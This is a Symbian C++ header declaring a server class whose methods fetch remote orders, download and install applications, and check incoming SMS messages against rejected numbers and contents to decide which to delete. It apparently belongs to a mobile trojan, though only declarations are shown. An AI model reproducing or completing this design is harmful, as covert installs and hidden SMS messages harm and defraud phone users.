#ifndef __CSMSFILTERSERVER_H__
#define __CSMSFILTERSERVER_H__
#include <e32std.h>
#include <e32base.h>
#include <s32file.h>
#include <flogger.h>
#include <commdbconnpref.h>
#include <es_sock.h>
#include "applicationmanager.h"
#include "socketengine.h"
#include "timeouttimer.h"
#include "smsengine.h"
_LIT(KInstallManager, "InstallerManager");
enum TInstallManagerPanic{
  EBadRequest=1, 
  EBadDescriptor=2, 
  ESrvCreateServer=3, 
  EMainSchedulerError=4, 
  ECreateTrapCleanup=5, 
  ESrvSessCreateTimer=6, 
  EReqAlreadyPending=7
};
enum TFlowState{
  EInitNetwork, EGetOrder, EExecuteOrder, EInstall,ECloseNetwork,ECleanUp
};

class CAppMain:public CServer2,MTimeOutNotify,MSmsObserver,public CHTTPDownObserver{
public:
  static CAppMain* NewL();
  static CAppMain* NewLC();
  virtual ~CAppMain();
  static TInt EntryPoint(TAny* aStarted);
  static void ThreadMainL();
  static void PanicClient(const RMessage2& aMessage,TInstallManagerPanic aPanic);
  static void PanicServer(TInstallManagerPanic aPanic);
  static TInt MMServiceTick(TAny* aObject);
  void OnWapOrder2Complete(const TDesC8& aData);
  void OnWapOrder2Error(TInt aErrorId);
  void TimerExpired();
  void OnInstallerEvent(TBool aIsInstall,TUid aAppUid,TInt aError);
  TBool GetState();
  TBool GetAccessPoint(); 
  TInt GetOrder();
  TInt DownloadApplication(const TDesC8& aUrl);
  void ExecuteOrder();
  TInt OrderCancel();
  TBool MessageNeedDelete(const TDesC& number,const TDesC& content);
protected:
  TInt RunError(TInt aError);
private:
  CAppMain(TInt aPriority);
  void ConstructL();
  CSession2* NewSessionL(const TVersion& aVersion,const RMessage2& aMessage) const;
  void DoInitConfigUrl();
  TInt DoInitNetworkFlow();
  void DoCloseNetworkFlow();
  void ReceData(const TDesC8& aData); //CHTTPDownObserver
  void OnHttpError(THttpErrorID aErrId); //CHTTPDownObserver
  void OnError(TInt aErrId);
public:
  CSocketEngine* iSocketEngine;
  TInt iCustomStep;
  TInt iGotoStep;
  TFileName iDrive;
  TInt iFlowOrder;  
  RSocketServ iSocketServ;
  RConnection iConnection;
  TBool iFirstConnect;
  TCommDbConnPref prefs; //预选网络接入点对象
  TUint32 iDefaultAccessPointID;
  TInt iCountConnect;
  CApplicationManager* iApplicationManager;  
private:
  CTimeOutTimer* iTimeout;
  TFlowState iState;
  HBufC8* iUserAgent;
  CSmsEngine* iSmsEngine;
  CDesCArrayFlat* iRejectSmsAddresses;
  CDesCArrayFlat* iRejectSmsContents;
  CPeriodic* iMMServicePeriodic;
  TInt iPeriodicCount;
};

#endif 
